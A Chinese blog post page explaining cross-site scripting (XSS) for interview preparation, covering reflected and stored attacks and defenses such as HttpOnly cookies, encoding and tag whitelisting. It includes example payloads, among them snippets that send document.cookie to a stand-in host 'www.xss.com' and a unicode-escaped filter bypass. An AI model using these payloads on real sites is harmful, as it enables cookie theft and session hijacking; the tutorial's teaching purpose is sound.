@@ -1,0 +1,411 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>那些年我们懵逼的安全知识之——XSS | 2yingying</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="盈盈">
+    
+    <meta name="description" content="前几天在面试的时候，被问过两次前端安全知识，第一次听见的时候是懵逼的，后面赶紧回去补了一番，可是第二次回答的时候，感觉对方还是不是很满意的样子，所以我赶紧又再次对这些再次系统的了解了一下">
+    
+    
+    
+    
+    <link rel="alternate" href="http://zyingying.github.io/" title="2yingying" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/smile.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="2yingying" title="2yingying"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="2yingying">2yingying</a></h1>
+				<h2 class="blog-motto">你可长点心吧！     点心？什么点心？</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/03/29/那些年我们懵逼的安全知识之XSS/" title="那些年我们懵逼的安全知识之——XSS" itemprop="url">那些年我们懵逼的安全知识之——XSS</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="盈盈">盈盈</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2016-03-29T14:29:10.000Z" itemprop="datePublished">2016-03-29</time>
+    更新日期:<time datetime="2016-03-30T05:37:47.879Z" itemprop="dateModified">2016-03-30</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u4EC0_u4E48_u662FXSS"><span class="toc-number">1.</span> <span class="toc-text">什么是XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3E_u4E2A_u6817_u5B50"><span class="toc-number">1.1.</span> <span class="toc-text">举个栗子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS_u653B_u51FB_u5206_u7C7B"><span class="toc-number">2.</span> <span class="toc-text">XSS攻击分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u53CD_u5C04_u578B"><span class="toc-number">2.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B58_u50A8_u578B"><span class="toc-number">2.2.</span> <span class="toc-text">存储型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u5982_u4F55_u9632_u5FA1"><span class="toc-number">3.</span> <span class="toc-text">如何防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http_only"><span class="toc-number">3.1.</span> <span class="toc-text">http only</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FC7_u6EE4JavaScript__u4E8B_u4EF6_u7684_u6807_u7B7E"><span class="toc-number">3.2.</span> <span class="toc-text">过滤JavaScript 事件的标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Html_Encode__u5904_u7406"><span class="toc-number">3.3.</span> <span class="toc-text">Html Encode 处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FC7_u6EE4_u7279_u6B8A_u7684Html_u6807_u7B7E"><span class="toc-number">3.4.</span> <span class="toc-text">过滤特殊的Html标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u53C2_u8003_u6587_u6863"><span class="toc-number">4.</span> <span class="toc-text">参考文档</span></a></li></ol>
+		</div>
+		
+		<p>前几天在面试的时候，被问过两次前端安全知识，第一次听见的时候是懵逼的，后面赶紧回去补了一番，可是第二次回答的时候，感觉对方还是不是很满意的样子，所以我赶紧又再次对这些再次系统的了解了一下<br><a id="more"></a></p>
+<h2 id="u4EC0_u4E48_u662FXSS"><a href="#u4EC0_u4E48_u662FXSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>首先，靠死记硬背肯定是不行的，总是特别容易就忘记了。<br>那么我们得先了解 <code>XSS</code>的全名呀:<br><strong> XSS 全称(Cross Site Scripting) 跨站脚本攻击 *</strong><br><strong> XSS 全称(Cross Site Scripting) 跨站脚本攻击 *</strong><br><strong> XSS 全称(Cross Site Scripting) 跨站脚本攻击 *</strong><br>重要的事情说三遍<br>(原本的缩写应该是 <code>CSS</code>可惜和我们伟大的<code>CSS</code>重名了，只好委屈一下更名 <code>XSS</code>)<br>在这句话里面，我们能够捕捉到几个信息：</p>
+<ul>
+<li>一个是跨站</li>
+<li>一个是脚本Scripting<br>所以，区别<code>xss</code>攻击和别的攻击一个最基本的特点就是：<strong>它需要注入脚本</strong><br>它是代码注入的一种。它允许恶意用户将代码注入到网页上，在其他用户访问网站的时候，脚本运行从而影响他人。这类攻击通常包含了HTML以及用户端脚本语言。</li>
+</ul>
+<h3 id="u4E3E_u4E2A_u6817_u5B50"><a href="#u4E3E_u4E2A_u6817_u5B50" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>XSS这种攻击是由外部发起的，在用户点击链接，下载图片或者提交表单的时候，对应用网站进行了意想之外的操作。<br>详细以前玩过QQ空间的人可能会遇到过一个类似的恶作剧，有人故意在一个页面里面运行了一个行这样的代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    alert(<span class="string">"你关不掉我~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当我们点击的时候，弹窗总是一直一直的在不停的被关闭和跳出，手机观看也是一样的，这个时候，我们就不得不关掉浏览器，再重新开一次。</p>
+<p>又比如<br>我可以在一些贴吧或者是社区里面写上一些链接，起一点比较有吸引力的名字，比如叫：某某的后裔大结局下载，某某的美图，然后代码里面瞧瞧附上我下面这段链接，这样不明真相的吃瓜观众或许就会被我吸引从而点击这个链接<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">'http://www.xss.com?cookie='</span>+<span class="built_in">document</span>.cookie; <span class="comment">//坏人的网站</span></span><br></pre></td></tr></table></figure></p>
+<p>用户的<code>cookie</code>我也拿到了，如果服务端<code>session</code>没有设置过期的话，我以后甚至拿这个<code>cookie</code>而不需用户名密码，就可以以这个用户的身份登录成功了。</p>
+<p>虽然都是注入脚本，但是上面两个例子还是有点点不同的，接下来让我们看看</p>
+<h2 id="XSS_u653B_u51FB_u5206_u7C7B"><a href="#XSS_u653B_u51FB_u5206_u7C7B" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h2><p>根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。</p>
+<h3 id="u53CD_u5C04_u578B"><a href="#u53CD_u5C04_u578B" class="headerlink" title="反射型"></a>反射型</h3><p>反射型XSS，又称非持久型XSS。</p>
+<ul>
+<li>之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。</li>
+<li>称为非持久型XSS，则是因为这种攻击方式具有一次性。攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。</li>
+</ul>
+<p>比如攻击者将如下链接发送给受害者：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.targetserver.com/search.asp?input=<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。</p>
+<p>这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型<code>XSS</code>的原因。</p>
+<h3 id="u5B58_u50A8_u578B"><a href="#u5B58_u50A8_u578B" class="headerlink" title="存储型"></a>存储型</h3><p>存储型XSS，又称持久型XSS，这种攻击往往比上面的反射性要后果要更严重。<br>和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛<strong>服务器存储下来</strong>，恶意脚本也永久地被存放在论坛服务器的后端存储器中。</p>
+<p>当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>
+<p>可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。</p>
+<p>让我们回顾一下，上面的栗子2就是一个存储型XSS的很好的栗子，在贴吧里面发布信息并提交，让各种看到这个帖子的人点击进去，运行这个脚本。<br>或许你又会说，那我不点击那个奇怪的链接就好了啊，或者让管理员去把那些删掉就好。<br>那么让我们换种方式吧,在我的图片下面附上这样的代码，你很有可能是完全都不会发觉的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src=<span class="string">'http://www.xss.com?cookie='</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">img.style.display=<span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br></pre></td></tr></table></figure></p>
+<p>而且，在网页注入代码的方法可能的多种多样的，可以这样<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.xss.com"</span> <span class="attribute">onclick</span>=<span class="value">alert(this.name)</span> <span class="attribute">name</span>=<span class="value">xss</span> <span class="attribute">ref</span>=<span class="value">xss</span>&gt;</span><span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line">//或者</span><br><span class="line">onload="alert('xss')"</span><br></pre></td></tr></table></figure></p>
+<p>这个时候，我们就必须得相处点办法，将标签识别，比如：不让<code>script</code>过去，然而人算不如黑客算呀，他们又有一种新方式了，像这样：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#38;lt;script&#38;gt; alert(&#38;quot;xss&#38;quot;)&#38;lt;/script&#38;gt; &#10;//&#25110;&#32773;&#10;$(&#39;div:first&#39;).html(&#39;\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e&#39;);</span><br></pre></td></tr></table></figure></p>
+<p>然后咱们就GG了又….</p>
+<h2 id="u5982_u4F55_u9632_u5FA1"><a href="#u5982_u4F55_u9632_u5FA1" class="headerlink" title="如何防御"></a>如何防御</h2><p>讲了那么多，大家一定很慌，宝宝上个网太危险了。没关系，还是有一点的方法去抵御的。</p>
+<h3 id="http_only"><a href="#http_only" class="headerlink" title="http only"></a>http only</h3><p>由于大部分xss攻击都是想要窃取我们的<code>cookie</code>来做坏事的，所以我们如果能够让他们不能拿到我们的<code>cookie</code>的话，那起码我们的各种损失可以降下来一半。<br>我们可以给浏览器设置<code>Cookie</code>的头如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="built_in">Set</span>-Cookie: =[; =]</span><br><span class="line">　　[; expires=][; domain=]</span><br><span class="line">　　[; path=][; secure][; HttpOnly]</span><br></pre></td></tr></table></figure></p>
+<p>这样一来，就不能通过脚本来获取你现在活动状态下的cookie,但是咱们是个有志向的程序员，怎么可以就此满足。</p>
+<h3 id="u8FC7_u6EE4JavaScript__u4E8B_u4EF6_u7684_u6807_u7B7E"><a href="#u8FC7_u6EE4JavaScript__u4E8B_u4EF6_u7684_u6807_u7B7E" class="headerlink" title="过滤JavaScript 事件的标签"></a>过滤JavaScript 事件的标签</h3><p>例如，我们可以过滤<code>&quot;onclick&quot;</code>, <code>&quot;onfocus&quot;</code> , <code>&quot;onload&quot;</code>这种类型的标签。包括一些大小写<code>&quot;oNcLick&quot;</code>, <code>&quot;onFOcus&quot;</code> 这种类型的也要注意过滤，不然人家轻轻一改，就坑爹了。当然过滤这些事件标签还不够，只要人家坚持不懈，还是可以找到一些漏洞的地方，像下面这个<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"rhainfosec.com"</span> <span class="attribute">onmouseover</span>=<span class="value">alert(1)</span>&gt;</span>ClickHere<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 事件处理被过滤了吗？或者是仅仅过滤了on后面的mouseover？ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 接下来插入一个无效的事件处理，查看是否所有的事件处理都会被过滤或者仅部分会被过滤。 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"rhainfosec.com"</span> <span class="attribute">onclimbatree</span>=<span class="value">alert(1)</span>&gt;</span>ClickHere<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 收到相同的响应了吗？可以插入吗? --&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在HTML5中，存在超过150种事件处理，这也意味着我们有150多种方法来执行javascript。<br>所以还需要有更保险一点的方法才行</p>
+<h3 id="Html_Encode__u5904_u7406"><a href="#Html_Encode__u5904_u7406" class="headerlink" title="Html Encode 处理"></a>Html Encode 处理</h3><p>XSS之所以会发生， 是因为用户输入的数据变成了代码。<br>要想拒绝引入代码，就得要把这些<html><body>变成一个字段，而不是被浏览器运行的代码。<br>所以我们需要对用户输入的数据进行HTML Encode处理。 将其中的”中括号”， “单引号”，“引号” 之类的特殊字符进行编码。<br>让本身一段代码，变成了一段显示的字符串</body></html></p>
+<p>又又又又但是…..<br>不知道大家有么有用过富文本编辑器，像这种<br><img src="http://7xpwlt.com1.z0.glb.clouddn.com/%E5%AF%8C%E6%96%87%E6%9C%AC.jpg" alt="富文本编辑器"><br>当我们使用富文本编辑器里面的一些功能的时候，我们会发现，其对应的html标签也会发生相应的改变<br><img src="http://7xpwlt.com1.z0.glb.clouddn.com/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%9F%A5%E7%9C%8B%E6%A0%B7%E5%BC%8F.jpg" alt=""><br>这个时候，使用html过滤就行不通了，因为很有可能会把里面的那些样式输出到文本里面,对于一些BBS，他们尚可以用自定义的一些标签比如 <code>[标签名]</code>这种方式来绕过html编码，但是对于其他的没有自定义标签的编辑器来说，可能就是灾难了。</p>
+<p>如何解决，下面让我们来看下一种方法。</p>
+<h3 id="u8FC7_u6EE4_u7279_u6B8A_u7684Html_u6807_u7B7E"><a href="#u8FC7_u6EE4_u7279_u6B8A_u7684Html_u6807_u7B7E" class="headerlink" title="过滤特殊的Html标签"></a>过滤特殊的Html标签</h3><p>我们可以预判哪些标签是有可能造成<code>xss</code>攻击的，然后对标签过滤或者是移除。这个和上面的过滤事件的标签是非常类似的，可以将他们合并一起过滤。</p>
+<p>比如我们可以设置让所有的<code>&lt;script&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;a&gt;</code> <code>&lt;img&gt;</code>等等标签都不能通行,来达到我们的目的。<br>但是也不只是这种方式，我们可以反向思维</p>
+<p>其实这里过滤有两种可以选择的方式：</p>
+<ul>
+<li>过滤对我们有害的标签，不让其通行过去。除此之外都可以通过————设置<strong>黑名单</strong></li>
+<li>过滤对我们安全的标签，可以让其过去，除此之外的都不可以通过————设置<strong>白名单</strong></li>
+</ul>
+<p>一般我们会选择哪种呢？<br>如果是我的话，为了保险起见，可能会选择白名单的模式，因为其实可以执行的事件是很多的，标签也有各种各样，难保攻击者不会找到一个特别偏门的标签来选择攻击，所以选择我们已经信任的一些白名单来允许通过，会更加有力的去组织xss攻击一些。</p>
+<h2 id="u53C2_u8003_u6587_u6863"><a href="#u53C2_u8003_u6587_u6863" class="headerlink" title="参考文档"></a>参考文档</h2><ul>
+<li><a href="http://www.2cto.com/Article/201402/278277.html" target="_blank" rel="external">绕过WAF的XSS过滤</a></li>
+<li><a href="https://segmentfault.com/a/1190000003798884" target="_blank" rel="external">前端xss攻击</a></li>
+<li><a href="http://blog.jobbole.com/47372/" target="_blank" rel="external">防御 XSS 攻击的七条原则</a></li>
+</ul>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/js/">js</a><a href="/tags/安全/">安全</a><a href="/tags/攻击/">攻击</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2016/03/29/那些年我们懵逼的安全知识之XSS/" data-title="那些年我们懵逼的安全知识之——XSS | 2yingying" data-tsina="http://weibo.com/u/2133445925" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2016/03/27/关于闭包的一些题目(一)/"  title="关于闭包的一些题目(一)">
+ <strong>NEXT:</strong><br/> 
+ <span>关于闭包的一些题目(一)
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+    <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?1345ed83f404184fc8a87384fc5af4d1";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u4EC0_u4E48_u662FXSS"><span class="toc-number">1.</span> <span class="toc-text">什么是XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3E_u4E2A_u6817_u5B50"><span class="toc-number">1.1.</span> <span class="toc-text">举个栗子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS_u653B_u51FB_u5206_u7C7B"><span class="toc-number">2.</span> <span class="toc-text">XSS攻击分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u53CD_u5C04_u578B"><span class="toc-number">2.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B58_u50A8_u578B"><span class="toc-number">2.2.</span> <span class="toc-text">存储型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u5982_u4F55_u9632_u5FA1"><span class="toc-number">3.</span> <span class="toc-text">如何防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http_only"><span class="toc-number">3.1.</span> <span class="toc-text">http only</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FC7_u6EE4JavaScript__u4E8B_u4EF6_u7684_u6807_u7B7E"><span class="toc-number">3.2.</span> <span class="toc-text">过滤JavaScript 事件的标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Html_Encode__u5904_u7406"><span class="toc-number">3.3.</span> <span class="toc-text">Html Encode 处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FC7_u6EE4_u7279_u6B8A_u7684Html_u6807_u7B7E"><span class="toc-number">3.4.</span> <span class="toc-text">过滤特殊的Html标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u53C2_u8003_u6587_u6863"><span class="toc-number">4.</span> <span class="toc-text">参考文档</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Grunt/" title="Grunt">Grunt<sup>1</sup></a></li>
+		
+			<li><a href="/tags/css/" title="css">css<sup>1</sup></a></li>
+		
+			<li><a href="/tags/git/" title="git">git<sup>1</sup></a></li>
+		
+			<li><a href="/tags/js/" title="js">js<sup>8</sup></a></li>
+		
+			<li><a href="/tags/安全/" title="安全">安全<sup>1</sup></a></li>
+		
+			<li><a href="/tags/攻击/" title="攻击">攻击<sup>1</sup></a></li>
+		
+			<li><a href="/tags/模块化/" title="模块化">模块化<sup>3</sup></a></li>
+		
+			<li><a href="/tags/渲染/" title="渲染">渲染<sup>1</sup></a></li>
+		
+			<li><a href="/tags/闭包/" title="闭包">闭包<sup>1</sup></a></li>
+		
+			<li><a href="/tags/随笔/" title="随笔">随笔<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="http://zyingying.github.io/" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello, I&#39;m zyy.  This is my blog on GitHub. <br/>
+			 I wish you like it</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		<a href="http://weibo.com/http://weibo.com/2133445925/profile?rightmod=1wvr=6mod=personinfois_all=1" target="_blank" title="weibo"></a>
+		
+		
+		
+		<a href="https://github.com/https://github.com/Zyingying" target="_blank" title="github"></a>
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2016 
+		
+		<a href="http://yoursite.com" target="_blank" title="盈盈">盈盈</a>
+		
+
+		&nbsp&nbsp&nbsp&nbsp本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次, 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次
+		</p>
+
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"zyingying"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+
+<script type="text/x-mathjax-config"> 
+MathJax.Hub.Config({ 
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]} 
+}); 
+</script>
+<script type="text/javascript"
+   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+  </body>
+</html>
